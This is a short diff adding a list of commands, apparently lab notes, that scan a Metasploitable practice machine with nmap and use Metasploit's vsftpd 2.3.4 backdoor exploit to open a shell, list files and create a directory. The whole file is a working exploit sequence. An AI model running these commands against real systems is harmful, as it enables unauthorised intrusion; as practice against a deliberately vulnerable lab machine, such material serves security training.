@@ -1,0 +1,9 @@
+nmap -sV -A <Metasploitable_IP>
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <Metasploitable_IP>
+exploit
+shell
+ls
+mkdir hhh
